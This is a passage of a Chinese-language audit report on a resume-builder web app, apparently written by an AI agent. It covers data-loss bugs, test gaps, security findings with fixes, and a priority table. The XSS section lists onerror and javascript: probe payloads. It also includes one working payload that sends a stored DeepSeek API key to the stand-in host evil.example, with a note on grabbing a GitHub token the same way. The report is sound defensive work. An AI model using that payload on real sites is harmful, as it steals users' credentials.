| **权威** | [hasUsableProfile.ts:14-23](src/lib/profile/hasUsableProfile.ts#L14) | name + entities + **skillGroups** + **certificateText** + **languageText** + **selfEvaluationContent** |
| **导入用的那份** | [ImportProfileDialog.tsx:24-25](src/app/app/dashboard/profile/ImportProfileDialog.tsx#L24) | 只有 `basic.name` 与 `entities` |

- **问题原因**：导入对话框自己写了一个 `hasContent`，范围比权威版窄。
- **影响范围**：**数据丢失路径**。库里只有技能分组 / 证书奖项 / 语言能力 / 自我评价（没有姓名、没有条目）时，`hasContent` 返回 `false` → 界面判定为「空库」→ **直接覆盖，不给用户存档的机会**。而这份数据恰恰是最难重建的那部分（技能分组是手工排的）。
- **顺序**：**P1**（改动是把 `hasContent` 换成 import `hasUsableProfile`，一行）

## 5.5 【P1】简历列表卡片不解析图片引用 → 证件照不显示

| 位置 | 事实 |
|---|---|
| [ResumeCardItem.tsx:112](src/app/app/dashboard/resumes/ResumeCardItem.tsx#L112) | 直接 `<ResumeTemplateComponent data={resume} />` |
| [imageStore.ts:118](src/lib/imageStore.ts#L118) | `resolveImagesInElement` 负责把 `idb:img_xxx` 引用解析成可渲染的 URL |
| 全仓调用点 | **只有一处**：[preview/index.tsx:146](src/components/preview/index.tsx#L146) |

- **问题原因**：照片存的是 `idb:` 引用，浏览器 `<img src="idb:...">` 无法渲染。解析函数只在工作台预览里被调用，**列表页没人调**。
- **影响范围**：简历列表卡片缩略图里的证件照是**空白**，而点进工作台预览就正常。用户看到的现象是「列表里照片丢了，进去又有了」。
- **顺序**：**P1**（在 `ResumeCardItem` 挂一个 effect 调 `resolveImagesInElement`，与 preview 同款）

## 5.6 【P2】「从磁盘恢复」这条链没有消费者

| 位置 | 事实 |
|---|---|
| [lib/saves/tree.ts](src/lib/saves/tree.ts) | 读整棵存档树 |
| [lib/saves/legacy.ts](src/lib/saves/legacy.ts) | 老格式迁移 |
| `GET /api/saves` | [routes/api/saves.ts:56](src/routes/api/saves.ts#L56) 唯一的消费者是 `scripts/e2e/saves.ts`，**app 内无人调用** |

- **影响范围**：`saves/` 目前是**只写不读**的单向镜像。「磁盘上的存档能恢复回浏览器」这个能力**没有接线** —— 用户换台机器打开站点，磁盘上有数据也读不回来。
- **顺序**：**P2**（是个功能缺口，不是 bug；但文档里「磁盘是真相源」的说法与这个事实冲突，要么实现读取，要么把措辞降级为「磁盘是备份」）

---

# 六、缺少测试的关键流程

## 6.1 测量结果

| 维度 | 数字 |
|---|---|
| 源文件 | 302 个 / 37,764 行 |
| 单元测试文件 | 25 个 |
| 组件测试文件 | **0 个** |
| e2e 脚本 | 9 个（Playwright） |
| `src/lib/**` 模块覆盖率 | 18 / 37 |

## 6.2 缺口（按危险程度）

| # | 缺口 | 位置 | 问题原因 | 影响范围 | 顺序 |
|---|---|---|---|---|---|
| 1 | **`analyzeMatch.ts` 无测试** | [src/lib/match/analyzeMatch.ts](src/lib/match/analyzeMatch.ts) | 它是整条匹配链路的**编排者**（缓存判定 → 构造 prompt → 发请求 → 解析 → 校验 → 重试）。被它调用的 4 个模块 **全部有测试**（`analysisCache` / `buildMatchPrompt` / `validateMatchResult` / `fitLevel`） | **缺口恰好在最上层**。各零件测得再细，也测不到「零件之间接错了」——比如缓存命中判定与重试逻辑的相互作用。这条链路会花用户真钱（调 LLM），改坏了不会立刻发现 | **P0** |
| 2 | **服务端三文件全无测试** | [llm.ts](src/lib/server/llm.ts) / [llmRoute.ts](src/lib/server/llmRoute.ts) / [upstream.ts](src/lib/server/upstream.ts) | 请求形状校验、错误映射（400 vs 502）、超时合并、`finish_reason === "length"` 截断检测，**一条都没测** | 这层是**唯一接触用户 API Key 的代码**。它出错的现象是「用户看到莫名其妙的失败」，而根因在服务端日志里 | **P1** |
| 3 | **零注入测试** | 全仓 `scripts/e2e/` | 实测 grep `onerror` / `javascript:` / `<script` **零命中** | 与安全 §7.1 直接相关：XSS 之所以能活到现在，是因为**没有任何测试会撞上它**。修复后必须补一条会失败的用例钉住 | **P0**（与安全项同批修） |
| 4 | 备份**编排层**无单测 | [BackupPanel.tsx](src/app/app/dashboard/settings/BackupPanel.tsx) 的 `apply()` | **先纠正一个容易写错的判断**：`buildBackup` / `parseBackup` / `mergeById` 其实测得相当细（[backup.test.ts](src/lib/backup.test.ts) 有 20+ 用例，含「拒绝更高版本备份」「跳过缺少 id 的脏数据」），三个 store 的 `replaceResumes` / `replaceTargets` 也有单测。**真正没测的是把它们串起来的那一层** —— `apply()` 里先写 profile、再 `replaceResumes`、再逐个 `normalizeImportedTarget` 写 targets 的顺序与失败处理 | 备份是**用户数据的最后一道防线**。零件都测过了，但「串联顺序错了」或「中间某步抛异常后半途而废」测不到 —— 现象是「导入成功提示了但数据只进来一半」 | **P2**（比原判降一级：零件覆盖良好，缺的是编排） |
| 5 | **`scripts/` 不在类型检查范围内** | [tsconfig.json:19](tsconfig.json#L19) `"include": ["src/**/*.ts", "src/**/*.tsx", "vite.config.ts"]` | 9 个 e2e 脚本（其中 4 个是 `.ts`）+ `scripts/eval.ts` + `scripts/subset-fonts.ts` **编译期零检查**。它们跑得起来只说明运行时没炸，字段拼错、类型不符这类问题要等运行时才暴露 | **测试工装自身没有安全网**。e2e 是这条项目对 UI 唯一的自动化验证手段，工装坏了会**静默产生假绿**（测试通过但没真在测） | **P1**：把 `scripts/**/*.ts` 加进 `include`，代价是要么修一堆既存类型错、要么先只加 `scripts/audit` 这类新写的 |
| 6 | 无 schema 校验 | 全仓 | `package.json` **无任何校验库**（zod/yup/ajv/valibot 全无）。JSON 导入靠 `JSON.parse` + `catch` 兜底（[ResumeWorkbench.tsx:183-197](src/app/app/dashboard/resumes/ResumeWorkbench.tsx#L183)） | 导入任意形状的 JSON 都会**直接展开进 store**。既是安全问题（§六·1）也是稳定性问题：字段缺失/类型错误会在渲染期才炸 | **P0** |

---

# 七、明显的安全问题

## 7.1 【P0】富文本字段无净化即注入 DOM（XSS）

**文件位置**

| 渲染点（24 处，全部同一模式） | 代表位置 |
|---|---|
| 技能 / 自我评价 / 教育 / 工作 / 项目 / 自定义 描述 | [classic/sections/SkillSection.tsx:21](src/components/templates/classic/sections/SkillSection.tsx#L21)、[ExperienceSection.tsx:45](src/components/templates/classic/sections/ExperienceSection.tsx#L45) 等 4 套模板 × 6 类板块 |

**问题原因**（三层，缺一不可）

1. 数据源不可信：[ResumeWorkbench.tsx:183-197](src/app/app/dashboard/resumes/ResumeWorkbench.tsx#L183) 的 JSON 导入做的是 `{...initialResumeState, ...config}` —— **整个外部对象直接展开**，无字段白名单、无类型校验。
2. 渲染无净化：[richText.ts](src/lib/richText.ts) 的 `normalizeRichTextContent` 名字像净化器，**实际只做三件事**：给 `<a>` 补 class、清理空 `<p>`、**纯文本**时做 HTML 转义（`if (!HTML_TAG_REGEX.test(content))` —— 一旦内容里有任何 HTML 标签，转义整条路径被跳过）。它不移除任何标签、不移除任何事件属性。
3. 无兜底防线：全仓 **无 CSP**（`server.mjs` 只透传上游响应头，未注入 `Content-Security-Policy`）。

`dangerouslySetInnerHTML={{ __html: normalizeRichTextContent(x) }}` 直接把 `x` 当 HTML 插入。

**实测验证**（脚本 `/tmp/xss-proof.mjs`，复刻 [richText.ts](src/lib/richText.ts) 的逻辑跑 7 个载荷）：**7/7 原样存活**。

| 载荷 | 经 `normalizeRichTextContent` 后的输出 |
|---|---|
| `<img src=x onerror="alert(1)">` | **原样** |
| `<svg onload="alert(1)">` | **原样** |
| `<iframe src="javascript:alert(1)">` | **原样** |
| `<span onmouseover="alert(1)">` | **原样** |
| `<a href="javascript:alert(1)">` | 原样，**且被主动加上 `class="rich-text-link"`**（函数给 `href` 加了样式类，却没看 `href` 是什么协议） |

**⚠️ 精确说明执行条件**（避免夸大）：React 的 `dangerouslySetInnerHTML` 底层走 `innerHTML`，因此**内联 `<script>` 不会执行**。真正可利用的是另外三类：

1. **事件处理器**（`onerror` / `onload` / `onmouseover`）—— 插入 DOM 时即触发，**无需用户交互**。`<img src=x onerror=...>` 是最直接的一条。
2. **`javascript:` 协议的链接** —— 需用户点击一次。
3. **`<iframe>` 等** —— `javascript:` 源同样需交互。

**可完整利用的载荷**（实测原样存活）：

```html
<img src=x onerror="fetch('https://evil.example/?k='+localStorage.getItem('ai-config-storage'))">
```

插入简历描述字段后，打开工作台即发起请求，把 DeepSeek API Key 送到攻击者服务器。把 `ai-config-storage` 换成 `resume-storage` 即可拿到 `basic.githubKey`（见 §7.2）。

**影响范围**

- 触发路径：用户导入他人分享的简历 JSON（求职场景里这是**常规操作**）→ 打开工作台或预览即执行。
- 可窃取：`ai-config-storage`（DeepSeek API Key）、`resume-storage`（含 `basic.githubKey` GitHub token）、`profile-storage`（姓名/邮箱/电话/生日/所在地）。
- 影响面**不止当前用户**：恶意 HTML 随 `saves/` 镜像落盘、随 JSON 导出传播，形成二次扩散。
- 对照实验：同仓的**结构链接是安全的** —— [projectLink.ts:13](src/lib/projectLink.ts#L13) 的 `getProjectLinkHref` 会拦 `javascript:`，自定义字段也走了它（[customField.ts:30](src/lib/customField.ts#L30)）。**唯独富文本这条路径没有任何等价的拦截**。

**处理顺序：P0。** 且必须与 §6.2 第 3 条（零注入测试）同批 —— 修完要有一个会失败的测试钉住。

**修复建议（含一个陷阱）**

渲染时净化，而不是继续用「规范化」冒充。但有一个必须避开的坑：

| 事实 | 依据 |
|---|---|
| 项目**已经**装了 DOMPurify —— `dompurify@2.5.8`，作为 `jspdf` 的传递依赖 | `pnpm-lock.yaml` 间接依赖；产物里已有 `purify.es-*.js` |
| **但 2.5.8 本身有已知绕过** | CVE-2025-15599（2.5.3–2.5.8 受影响，**2.x 分支从未被修补**，只在 3.2.7 修）；CVE-2026-0540（2.5.3–2.5.8 受影响，2.5.9 修） |
| 许可证可用 | `(MPL-2.0 OR Apache-2.0)`，可直接依赖 |

**所以不要写成 `import DOMPurify from "dompurify"` 直接用那个 2.5.8** —— 拿一个有已知绕过的版本去做安全净化，等于把洞换个地方。要**显式加一条 `dompurify@^3.3.2` 的直接依赖**（固定到已修复版本）。

**⚠️ 一个反直觉的注意点**：本项目的富文本**允许用户加颜色、高亮、对齐**（见 [RichEditor.tsx](src/components/shared/rich-editor/RichEditor.tsx) 的工具栏），这些靠 inline `style` 属性实现。DOMPurify **默认会剥掉 `style`**，直接用会把用户的排版全清空。需要显式放行 `style` 属性 —— 而一旦放行 `style`，CSS 注入面（`background:url(...)` 之类）也要一并评估。这不是「加一行就完事」的修复，**改动会影响已有简历的显示**，需要回归测试。

## 7.2 【P0】GitHub token 随简历 JSON 导出外泄

**文件位置**

| 环节 | 位置 |
|---|---|
| 存储（明文，无加密） | [types/resume.ts:97](src/types/resume.ts#L97) `githubKey: string`，存进 `resume-storage` |
| 导出 | [export.ts:121](src/utils/export.ts#L121) `JSON.stringify(resume, null, 2)` —— **序列化整个 resume 对象** |
| 消费 | [GithubContribution.tsx:47](src/components/shared/GithubContribution.tsx#L47) 以 `Authorization: Bearer ${token}` 直连 `api.github.com` |

**问题原因**：`githubKey` 存在 `resume.basic` 下，而导出用的是整体序列化，**没有字段排除**。

**影响范围**：用户点「导出 JSON」把简历发给招聘方 / 贴进 GitHub gist / 存进公开仓库时，**GitHub personal access token 明文一起发出去**。拿到 token 的人可以读写该用户的仓库。这个操作在求职流程里极其常见。

**处理顺序：P0。** 修法很轻（导出前剔除 `basic.githubKey`），但**要先确认历史导出文件**有没有已经流出去。

## 7.3 【P1】限流在默认配置下退化为单一全局桶

**文件位置**：[rateLimit.ts:83-100](src/lib/server/rateLimit.ts#L83) `clientIpOf`

**问题原因**：默认不信任何转发头，取不到 IP 时**所有请求共用 `bucket: "unknown"`**。
代码注释明确说这是**刻意取舍**（「防伪造：直连部署下 X-Forwarded-For 完全由客户端控制，信它等于没限流」）。所以这不是 bug，是**部署配置要求**。

**影响范围**：
- 没设 `TRUST_PROXY=1` 且跑在反向代理后 → 所有访客共享 30 次/分的额度，**一个人能把全站 AI 功能打停**。
- 设了 `TRUST_PROXY=1` 但实际直连公网 → 转发头可伪造，**限流完全绕过**，`/api/match` 变成任何人都能用的 LLM 开放转发层。

**已做的缓解**（应记入功劳）：`server.mjs:229` 启动时打印当前限流模式，README:96 与 docs/05:327 都有说明。

**处理顺序：P1** —— 不是改代码，是**部署前必须核对的一步**。若这个项目要给别人部署，建议启动时在模式为 `SHARED` 时打印 **WARNING 级**提示而非普通 log。

## 7.4 【P2】存档端点一旦开启即是全量数据泄露面

**文件位置**：[routes/api/saves.ts](src/routes/api/saves.ts)（头注释已自认）

**事实**：`GET /api/saves` **不带任何参数**时返回**所有用户**的整棵存档树。没有鉴权、没有用户身份概念。

**影响范围**：只要 `SAVES_ENABLED=1` 且部署到公网，任何访问者一个 GET 就能拿走所有人的姓名、联系方式、完整经历。

**已做的缓解**：默认关闭；关掉时返回 404 与「路由不存在」不可区分（[saves.ts:33](src/routes/api/saves.ts#L33)），不泄露端点存在性。路径穿越防守是**两层**的（[saves.ts:67-107](src/lib/server/saves.ts#L67)：字符集白名单不含 `.` 与分隔符 + `path.relative` 二次确认）。

**处理顺序：P2** —— 定位是「本机/内网自用工具」，这个设计是自洽的。**但必须在 README 显眼处写明：不要开 `SAVES_ENABLED` 后直接暴露公网。**

## 7.5 未发现的问题（反向证据）

以下是常见安全问题，本仓**实测均无**：

| 检查项 | 命令 | 结果 |
|---|---|---|
| 密钥硬编码 | 人工审 `.env` | 无密钥，只有注释说明「本项目不依赖任何必需的环境变量」 |
| `.env` 入库 | `git ls-files --error-unmatch .env` | **未被跟踪**；`.gitignore` 覆盖 `.env` / `.env*.local` / `*.key` / `*.pem` |
| `saves/` 入库 | 读 `.gitignore` | 已忽略，且用的是 `/saves/`（带前导斜杠）—— 注释记录了踩过的坑：不带斜杠会连 `src/lib/saves/` 源码一起忽略 |
| 密钥进日志 | grep `console.` / `logger.` 于 `src/lib/server/` | **零命中** |
| `eval` / `new Function` | grep | **零命中** |
| 路径穿越 | 审 `resolveSavePath` / `resolveUserDir` | **两层防守**，字符集白名单 + `path.relative` 二次校验 |
| SQL 注入 | 无数据库 | 不适用 |
| 反代劫持 | grep `target="_blank"` | 全部带 `rel="noopener noreferrer"` |

---

---

# 八、处理顺序总表

| 顺序 | 条目 | 位置 | 类型 |
|---|---|---|---|
| **P0** | 富文本无净化即注入 DOM | [richText.ts](src/lib/richText.ts) + 24 处渲染点 + 导入路径 | 安全 |
| **P0** | GitHub token 随 JSON 导出外泄 | [export.ts:121](src/utils/export.ts#L121) | 安全 |
| **P0** | 补注入测试 | `scripts/e2e/` | 测试 |
| **P1** | `journal.ts` 接线或删除（含三处矛盾注释） | [lib/saves/journal.ts](src/lib/saves/journal.ts) | 数据丢失 |
| **P1** | 导入对话框的 `hasContent` 漏 4 个维度 → 非空库被判为空库、直接覆盖不存档 | [ImportProfileDialog.tsx:24](src/app/app/dashboard/profile/ImportProfileDialog.tsx#L24) | 数据丢失 |
| **P1** | 简历列表卡片不解析 `idb:` 图片引用 → 证件照空白 | [ResumeCardItem.tsx:112](src/app/app/dashboard/resumes/ResumeCardItem.tsx#L112) | 正确性 |
| **P1** | modern 模板缺 GitHub 贡献图（4 套模板复制体漏改） | [modern/sections/BaseInfo.tsx](src/components/templates/modern/sections/BaseInfo.tsx) | 功能缺失 |
| **P1** | 「至今」开关按界面语言文案判定 → 切语言后显示错 | [Field.tsx:71](src/components/editor/Field.tsx#L71) | 正确性 |
| **P0** | 给 `analyzeMatch` 补测试 | [analyzeMatch.ts](src/lib/match/analyzeMatch.ts) | 测试 |
| **P0** | i18n 缺 key 导致的界面显示原始 key（5 处） | 见 [feature-inventory.md](feature-inventory.md) P0 | 正确性 |
| **P1** | 条目标题兜底文案硬编码中文（英文界面显示中文，一处会写进数据） | 见 §一·补 | 正确性 |
| **P1** | 3 个孤儿文件 | 见 §一·1.1 | 死代码 |
| **P1** | 模板 key 映射写两遍 | [TemplateGallery.tsx:21](src/app/app/dashboard/resumes/TemplateGallery.tsx#L21) / [templates/page.tsx:31](src/app/app/dashboard/templates/page.tsx#L31) | 重复 |
| **P1** | 服务端三文件补测试 | `src/lib/server/` | 测试 |
| **P2** | 备份编排层 `apply()` 补测试（零件已有测试） | [BackupPanel.tsx](src/app/app/dashboard/settings/BackupPanel.tsx) | 测试 |
| **P1** | 部署前核对 `TRUST_PROXY` | [rateLimit.ts:83](src/lib/server/rateLimit.ts#L83) | 安全（配置） |
| **P1** | 32 项死代码 | 见 [feature-inventory.md](feature-inventory.md) P1 | 死代码 |
| **P2** | `useResumeStore.ts` 932 行拆分 | [useResumeStore.ts](src/store/useResumeStore.ts) | 复杂度 |
| **P2** | 移除 `@heroui/react`（需同步改 3 处） | [providers.tsx:9](src/app/providers.tsx#L9) + [tailwind.config.ts](tailwind.config.ts) | 依赖 |
| **P2** | 收敛 antd 与 HeroUI 两套 UI 框架 | `providers.tsx` | 依赖 |
| **P2** | 工作台无语言切换入口 | [LanguageSwitch.tsx](src/components/shared/LanguageSwitch.tsx) | 功能缺口 |
| **P3** | `DEFAULT_FONT_FAMILY` 去 export、删 `.mjs` MIME 死条目、PDF 图标区分、lodash 换自写 | 见 §一·1.3 / §二·2.2 / §三·3.1 | 清理 |

---

## 状态

六个维度全部完成。子代理的盘点在并入前**逐条抽样复核**，复核记录散见于各条目的「验证/实测」列。

| 维度 | 状态 | 条数 |
|---|---|---|
| 一、无人使用的文件 | ✅ | 3 个孤儿 + 3 个引用不足 |
| 一·补、硬编码中文 | ✅ | 5 处（最具体的一组） |
| 二、重复出现的功能 | ✅ | 5 组，其中 3 组已漂移 |
| 三、无用的依赖与接口 | ✅ | 4 个依赖 + 3 项接口 |
| 四、复杂度与调用链路 | ✅ | 13 个超限文件、70 个超长函数、5 条链 |
| 五、数据正确性缺陷 | ✅ | 6 条 |
| 六、缺少测试的关键流程 | ✅ | 6 个缺口 |
| 七、明显的安全问题 | ✅ | 4 条（含 2 条 P0）|

**本次体检的自我修正记录**（避免把错判留给读者）：
1. 一开始把「自定义字段 href 未经校验」列为疑似 XSS —— 复核发现它走了 `getProjectLinkHref`，**有校验**，撤下。
2. 一开始说备份的 `mergeById` / `replaceTargets` 无单测 —— 复核发现**测得相当细**，改为「缺的是编排层」（降级 P1→P2）。
3. 一开始用 `grep -c` 数 `preview/index.tsx` 的 props 得到 8，看着像在用 —— 实际那 8 次全是声明行与解构行本身，**确认为死 props**。
4. `bump` 被扫成依赖问题 —— 匹配到的是 `bump.config.ts`，**误报**，已标注。
